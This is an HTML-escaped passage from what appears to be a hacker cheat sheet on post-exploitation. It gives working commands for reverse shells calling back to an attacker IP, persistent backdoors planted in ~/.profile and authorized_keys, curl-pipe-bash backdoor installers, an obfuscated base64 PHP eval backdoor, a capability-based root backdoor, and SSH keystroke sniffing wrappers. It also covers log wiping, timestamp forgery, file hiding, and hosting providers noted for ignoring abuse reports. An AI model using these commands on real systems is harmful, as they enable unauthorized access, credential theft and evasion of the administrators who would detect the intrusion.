-f1 -d&#34; &#34; /proc/loadavg) PS=$(ps -e --no-headers|wc -l) \[\e[36m\]\u\[\e[m\]@\[\e[32m\]\h:\[\e[33;1m\]\w \[\e[0;31m\]\$\[\e[m\] &#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;reverse-shell-socat&#34;&gt;&lt;/a&gt; &lt;strong&gt;5.ii.c. Reverse shell with socat (fully interactive)&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;...or install socat and get it done without much fiddling about:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# on attacker&#39;s host (listener)&#xA;socat file:`tty`,raw,echo=0 tcp-listen:1524&#xA;# on target host (reverse shell)&#xA;socat exec:&#39;bash -li&#39;,pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;backdoor&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;6. Backdoors&lt;/h2&gt; &#xA;&lt;p&gt;Mostly we use gs-netcat&#39;s automated deployment script: &lt;a href=&#34;https://www.gsocket.io/deploy&#34;&gt;https://www.gsocket.io/deploy&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;bash -c &#34;$(curl -fsSLk https://gsocket.io/x)&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;bash -c &#34;$(wget --no-check-certificate -qO- https://gsocket.io/x)&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;backdoor-background-reverse-shell&#34;&gt;&lt;/a&gt; &lt;strong&gt;6.i. Background reverse shell&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;setsid bash -c &#39;while :; do bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1; sleep 360; done&#39; &amp;amp;&amp;gt;/dev/null&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or the user&#39;s &lt;em&gt;~/.profile&lt;/em&gt; (also stops multiple instances from being started):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;fuser /dev/shm/.busy &amp;amp;&amp;gt;/dev/null || nohup /bin/bash -c &#39;while :; do touch /dev/shm/.busy; exec 3&amp;lt;/dev/shm/.busy; bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1 ; sleep 360; done&#39; &amp;amp;&amp;gt;/dev/null &amp;amp;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;backdoor-auth-keys&#34;&gt;&lt;/a&gt; &lt;strong&gt;6.ii. authorized_keys&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Add your ssh public key to &lt;em&gt;/root/.ssh/authorized_keys&lt;/em&gt;. It&#39;s the most reliable backdoor ever :&amp;gt;&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;It survives reboots.&lt;/li&gt; &#xA; &lt;li&gt;It even survives re-installs. Admins have been known to make a backup of authorized_keys and then put it straight back onto the newly installed system.&lt;/li&gt; &#xA; &lt;li&gt;We have even seen our key being copied to other companies!&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Tip: Change the name at the end of the ssh public keyfile to something obscure like &lt;em&gt;backup@ubuntu&lt;/em&gt; or the admin&#39;s real name:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;$ cat id_rsa.pub&#xA;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0&#xA;[...]&#xA;u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C&#xA;c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;backdoor-network&#34;&gt;&lt;/a&gt; &lt;strong&gt;6.iii. Remote Access to an entire network&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Install &lt;a href=&#34;https://github.com/hackerschoice/gsocket&#34;&gt;gs-netcat&lt;/a&gt;. It creates a SOCKS exit-node on the Host&#39;s private LAN which is accessible through the Global Socket Relay Network without the need to run your own relay-server (e.g. access the remote private LAN directly from your workstation):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gs-netcat -l -S       # compromised Host&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Now from your workstation you can connect to ANY host on the Host&#39;s private LAN:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;gs-netcat -p 1080    # Your workstation.&#xA;&#xA;# Access route.local:22 on the Host&#39;s private LAN from your Workstation:&#xA;socat -  &#34;SOCKS4a:127.1:route.local:22&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Read &lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#scan-proxy&#34;&gt;Use any tool via Socks Proxy&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Other methods:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://iq.thc.org/tunnel-via-cloudflare-to-any-tcp-service&#34;&gt;Gost/Cloudflared&lt;/a&gt; - our very own article&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://thc.org/segfault/wireguard&#34;&gt;Reverse Wireguard&lt;/a&gt; - from segfault.net to any (internal) network.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;&lt;a id=&#34;carriage-return-backdoor&#34;&gt;&lt;/a&gt; &lt;strong&gt;6.iv. Smallest PHP Backdoor&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Add this line to the beginning of any PHP file:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php $i=base64_decode(&#34;aWYoaXNzZXQoJF9HRVRbMF0pKXtlY2hvIGAkX0dFVFswXWA7ZXhpdDt9&#34;);eval($i);?&amp;gt;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;(Thanks @dono for making this 3 bytes smaller than the smallest)&lt;/p&gt; &#xA;&lt;p&gt;Test the backdoor:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;### 1. Optional: Start a test PHP server&#xA;cd /var/www/html &amp;amp;&amp;amp; php -S 127.0.0.1:8080&#xA;### Without executing a command&#xA;curl http://127.0.0.1:8080/test.php&#xA;### With executing a command&#xA;curl http://127.0.0.1:8080/test.php -d 0=&#34;ps fax; uname -mrs; id&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ld-backdoor&#34;&gt;&lt;/a&gt; &lt;strong&gt;6.v. Local Root Backdoor&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Stay root once you got root&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;### Execute as root user&#xA;setcap cap_setuid+ep /lib/x86_64-linux-gnu/ld-linux-x86-64.so.2&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Become root&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;### Execute as non-root user&#xA;/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 /usr/bin/python3 -c &#39;import os;os.setuid(0);os.system(&#34;/bin/bash&#34;)&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;shell-hacks&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;7. Shell Hacks&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;shred&#34;&gt;&lt;/a&gt; &lt;strong&gt;7.i. Shred &amp;amp; Erase a file&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;shred -z foobar.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;## SHRED without shred command&#xA;shred()&#xA;{&#xA;    [[ -z $1 || ! -f &#34;$1&#34; ]] &amp;amp;&amp;amp; { echo &amp;gt;&amp;amp;2 &#34;shred [FILE]&#34;; return 255; }&#xA;    dd bs=1k count=$(du -sk ${1:?} | cut -f1) if=/dev/urandom &amp;gt;&#34;$1&#34;&#xA;    rm -f &#34;${1:?}&#34;&#xA;}&#xA;shred foobar.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Note: Or deploy your files in &lt;em&gt;/dev/shm&lt;/em&gt; directory so that no data is written to the harddrive. Data will be deleted on reboot.&lt;/p&gt; &#xA;&lt;p&gt;Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;restore-timestamp&#34;&gt;&lt;/a&gt; &lt;strong&gt;7.ii. Restore the date of a file&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Let&#39;s say you have modified &lt;em&gt;/etc/passwd&lt;/em&gt; but the file date now shows that &lt;em&gt;/etc/passwd&lt;/em&gt; has been modifed. Use &lt;em&gt;touch&lt;/em&gt; to change the file data to the date of another file (in this example, &lt;em&gt;/etc/shadow&lt;/em&gt;)&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;touch -r /etc/shadow /etc/passwd&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;shell-clean-logs&#34;&gt;&lt;/a&gt; &lt;strong&gt;7.iii. Clear logfile&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;This will reset the logfile to 0 without having to restart syslogd etc:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;&amp;gt;/var/log/auth.log # or on old shells: cat /dev/null &amp;gt;/var/log/auth.log&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will remove any line containing the IP &lt;code&gt;1.2.3.4&lt;/code&gt; from the log file:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;#DEL=thc.org&#xA;#DEL=${SSH_CLIENT%% *}&#xA;DEL=1.2.3.4&#xA;LOG=/var/log/auth.log&#xA;IFS=&#34;&#34; a=$(sed &#34;/${DEL}/d&#34; &amp;lt;&#34;${LOG}&#34;) &amp;amp;&amp;amp; echo &#34;$a&#34;&amp;gt;&#34;${LOG}&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;shell-hide-files&#34;&gt;&lt;/a&gt; &lt;strong&gt;7.iv. Hide files from that User without root privileges&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Our favorite working directory is &lt;em&gt;/dev/shm/&lt;/em&gt;. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.&lt;/p&gt; &#xA;&lt;p&gt;Hiding permanent files:&lt;/p&gt; &#xA;&lt;p&gt;Method 1:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;alias ls=&#39;ls -I system-dev&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;This will hide the directory &lt;em&gt;system-dev&lt;/em&gt; from the &lt;em&gt;ls&lt;/em&gt; command. Place in User&#39;s &lt;em&gt;~/.profile&lt;/em&gt; or system wide &lt;em&gt;/etc/profile&lt;/em&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Method 2: Tricks from the 80s. Consider any directory that the admin rarely looks into (like &lt;em&gt;/boot/.X11/..&lt;/em&gt; or so):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mkdir &#39;...&#39;&#xA;cd &#39;...&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Method 3: Unix allows filenames with about any ASCII character but 0x00. Try tab (&lt;em&gt;\t&lt;/em&gt;). Happens that most Admins do not know how to cd into any such directory.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mkdir $&#39;\t&#39;&#xA;cd $&#39;\t&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;linux-info&#34;&gt;&lt;/a&gt; &lt;strong&gt;7.v. Find out Linux Distro&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Find out Linux Distribution&#xA;uname -a; lsb_release -a; cat /etc/*release /etc/issue* /proc/version&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Speed check the system&#xA;curl -sL bench.sh | bash&#xA;# Another speed check:  &#xA;# curl -sL yabs.sh | bash&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;crypto&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;8. Crypto&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;gen-password&#34;&gt;&lt;/a&gt; &lt;strong&gt;8.i. Generate quick random Password&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Good for quick passwords without human element.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;openssl rand -base64 24&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If &lt;code&gt;openssl&lt;/code&gt; is not available then we can also use &lt;code&gt;head&lt;/code&gt; to read from &lt;code&gt;/dev/urandom&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;head -c 32 &amp;lt; /dev/urandom | xxd -p -c 32&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;or make it alpha-numeric&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;head -c 32 &amp;lt; /dev/urandom | base64 | tr -dc &#39;[:alnum:]&#39; | head -c 16&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;crypto-filesystem&#34;&gt;&lt;/a&gt; &lt;strong&gt;8.ii.a. Linux transportable encrypted filesystems - cryptsetup&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Create a 256MB large encrypted file system. You will be prompted for a password.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock&#xA;cryptsetup luksFormat /tmp/crypted&#xA;mkfs.ext3 /tmp/crypted&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Mount:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;losetup -f&#xA;losetup /dev/loop0 /tmp/crypted&#xA;cryptsetup open /dev/loop0 crypted&#xA;mount -t ext3 /dev/mapper/crypted /mnt/crypted&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Store data in &lt;code&gt;/mnt/crypted&lt;/code&gt;, then unmount:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;umount /mnt/crypted&#xA;cryptsetup close crypted&#xA;losetup -d /dev/loop0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;encfs&#34;&gt;&lt;/a&gt; &lt;strong&gt;8.ii.b. Linux transportable encrypted filesystems - EncFS&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Create &lt;code&gt;.sec&lt;/code&gt; and store the encrypted data in &lt;code&gt;.raw&lt;/code&gt;:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;mkdir .raw .sec&#xA;encfs --standard  &#34;${PWD}/.raw&#34; &#34;${PWD}/.sec&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;unmount:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;fusermount -u .sec&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a id=&#34;encrypting-file&#34;&gt;&lt;/a&gt; &lt;strong&gt;8.iii Encrypting a file&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Encrypt&#xA;openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I &amp;lt;input.txt &amp;gt;input.txt.enc&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Decrypt&#xA;openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I &amp;lt;input.txt.enc &amp;gt;input.txt&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-sniffing&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;9. SSH Sniffing&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-sniffing-strace&#34;&gt;&lt;/a&gt; &lt;strong&gt;9.i Sniff a user&#39;s SSH session with strace&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;strace -e trace=read -p &amp;lt;PID&amp;gt; 2&amp;gt;&amp;amp;1 | while read x; do echo &#34;$x&#34; | grep &#39;^read.*= [1-9]$&#39; | cut -f2 -d\&#34;; done&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Dirty way to monitor a user who is using &lt;em&gt;ssh&lt;/em&gt; to connect to another host from a computer that you control.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-sniffing-script&#34;&gt;&lt;/a&gt; &lt;strong&gt;9.ii Sniff a user&#39;s SSH session with script&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The tool &#39;script&#39; has been part of Unix for decades. Add &#39;script&#39; to the user&#39;s .profile. The user&#39;s keystrokes and session will be recorded to ~/.ssh-log.txt the next time the user logs in:&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;echo &#39;exec script -qc /bin/bash ~/.ssh-log.txt&#39; &amp;gt;&amp;gt;~/.profile&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Consider using &lt;a href=&#34;https://raw.githubusercontent.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/master/#bash-hide-arguments&#34;&gt;zap-args&lt;/a&gt; to hide the the arguments and /dev/tcp/3.13.3.7/1524 as an output file to log to a remote host.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-sniffing-wrapper&#34;&gt;&lt;/a&gt; &lt;strong&gt;9.iii. Sniff a user&#39;s SSH session with a wrapper script&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Even dirtier way in case &lt;em&gt;/proc/sys/kernel/yama/ptrace_scope&lt;/em&gt; is set to 1 (strace will fail on already running SSH clients unless uid=0)&lt;/p&gt; &#xA;&lt;p&gt;Create a wrapper script called &#39;ssh&#39; that executes strace + ssh to log the session:&lt;/p&gt; &#xA;&lt;details&gt; &#xA; &lt;summary&gt;Show wrapper script - CLICK HERE&lt;/summary&gt; &#xA; &lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;# Cut &amp;amp; Paste the following into a bash shell:&#xA;# Add a local path to the PATH variable so our &#39;ssh&#39; is executed instead of the real ssh:&#xA;echo &#39;PATH=~/.local/bin:$PATH #0xFD0E&#39; &amp;gt;&amp;gt;~/.profile&#xA;&#xA;# Create a log directory and our own ssh binary&#xA;mkdir -p ~/.local/bin ~/.local/logs&#xA;&#xA;cat &amp;lt;&amp;lt;__EOF__ &amp;gt;~/.local/bin/ssh&#xA;#! /bin/bash&#xA;strace -e trace=read -I 1 -o &#39;! ~/.local/bin/ssh-log \$\$&#39; /usr/bin/ssh \$@&#xA;__EOF__&#xA;&#xA;cat &amp;lt;&amp;lt;__EOF__ &amp;gt;~/.local/bin/ssh-log&#xA;#! /bin/bash&#xA;grep -F &#39;read(4&#39; | cut -f2 -d\\&#34; | while read -r x; do&#xA;        [[ \${#x} -gt 5 ]] &amp;amp;&amp;amp; continue &#xA;        [[ \${x} == +(\\\\n|\\\\r) ]] &amp;amp;&amp;amp; { echo &#34;&#34;; continue; }&#xA;        echo -n &#34;\${x}&#34;&#xA;done &amp;gt;\$HOME/.local/logs/ssh-log-&#34;\${1}&#34;-\`date +%s\`.txt&#xA;__EOF__&#xA;&#xA;chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log&#xA;. ~/.profile&#xA;&#xA;echo -e &#34;\033[1;32m***SUCCESS***.&#xA;Logfiles stored in ~/.local/.logs/.&#xA;To uninstall cut &amp;amp; paste this\033[0m:\033[1;36m&#xA;  grep -v 0xFD0E ~/.profile &amp;gt;~/.profile-new &amp;amp;&amp;amp; mv ~/.profile-new ~/.profile&#xA;  rm -rf ~/.local/bin/ssh ~/.local/bin/ssh-log ~/.local/logs/ssh-log*.txt&#xA;  rmdir ~/.local/bin ~/.local/logs ~/.local &amp;amp;&amp;gt;/dev/null \033[0m&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA; &lt;p&gt;(thanks to Gerald for testing this)&lt;/p&gt; &#xA;&lt;/details&gt; &#xA;&lt;p&gt;The SSH session will be sniffed and logged to &lt;em&gt;~/.ssh/logs/&lt;/em&gt; the next time the user logs into his shell and uses SSH.&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;ssh-sniffing-sshit&#34;&gt;&lt;/a&gt; &lt;strong&gt;9.iv Sniff a user&#39;s SSH session using SSH-IT&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;The easiest way is using &lt;a href=&#34;https://www.thc.org/ssh-it/&#34;&gt;https://www.thc.org/ssh-it/&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;bash -c &#34;$(curl -fsSL ssh-it.thc.org/x)&#34;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;vpn-shell&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;10. VPN &amp;amp; Shells&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a id=&#34;shell&#34;&gt;&lt;/a&gt; &lt;strong&gt;10.i. Disposable Root Servers&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code class=&#34;language-console&#34;&gt;$ ssh root@segfault.net # Use password &#39;segfault&#39;&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://thc.org/segfault&#34;&gt;https://thc.org/segfault&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;a id=&#34;vpn&#34;&gt;&lt;/a&gt; &lt;strong&gt;10.ii. VPN/VPS/Proxies&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;Trusted VPN Providers&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.mullvad.net&#34;&gt;https://www.mullvad.net&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.cryptostorm.is&#34;&gt;https://www.cryptostorm.is&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://proton.me&#34;&gt;https://proton.me&lt;/a&gt; - Offers FREE VPN&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://vpn.fail&#34;&gt;https://vpn.fail&lt;/a&gt; - Run by volunteers&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Virtual Private Servers&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.hetzner.com&#34;&gt;https://www.hetzner.com&lt;/a&gt; - Cheap&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://dmzhost.co&#34;&gt;https://dmzhost.co&lt;/a&gt; - Ignore most abuse requests&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://alexhost.com&#34;&gt;https://alexhost.com&lt;/a&gt; - DMCA free zone&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://basehost.eu&#34;&gt;https://basehost.eu&lt;/a&gt; - Ignores court orders&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://buyvm.net&#34;&gt;https://buyvm.net&lt;/a&gt; - Warez best friend&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://serverius.net&#34;&gt;https://serverius.net&lt;/a&gt; - Used by gangsters&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://1984.hosting&#34;&gt;https://1984.hosting&lt;/a&gt; - Privacy&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://bithost.io&#34;&gt;https://bithost.io&lt;/a&gt; - Reseller for DigitalOcean, Linode, Hetzner and Vultr (accepts Crypto)&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.privatelayer.com&#34;&gt;https://www.privatelayer.com&lt;/a&gt; - Swiss based.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Proxies (we dont use any of those)&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/mahdibland/V2RayAggregator&#34;&gt;V2Ray Proxies&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/snawoot/hola-proxy&#34;&gt;Hola Proxies&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Zaeem20/FREE_PROXIES_LIST&#34;&gt;Zaeem&#39;s Free Proxy List&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/bluet/proxybroker2&#34;&gt;Proxy Broker 2&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://api.proxyscrape.com/v2/?request=displayproxies&amp;amp;protocol=all&amp;amp;timeout=750&amp;amp;country=all&#34;&gt;proxyscrape.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.my-proxy.com&#34;&gt;my-proxy.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://getfreeproxylists.blogspot.com/&#34;&gt;getfreeproxylists.blogspot.com&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://proxypedia.org/&#34;&gt;proxypedia.org&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://socks-proxy.net/&#34;&gt;socks-proxy.net&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://www.thc.org/segfault&#34;&gt;Segfault&lt;/a&gt;: &lt;code&gt;curl -x socks5h://$(PROXY) ipinfo.io&lt;/code&gt; - selects a random proxy for every request&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;Many other services (for free)&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://free-for.dev/&#34;&gt;https://free-for.dev/&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;hr&gt; &#xA;&lt;p&gt;&lt;a id=&#34;osint&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h2&gt;11. Intelligence Gathering&lt;/h2&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;OSINT Hacker Tools&lt;/th&gt; &#xA;   &lt;th&gt;&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://osint.sh&#34;&gt;https://osint.sh&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Free. Subdomain Finder, DNS History, Public S3 Buckets, Reverse IP, Certificate Search and much more&lt;/td&gt; &#xA;  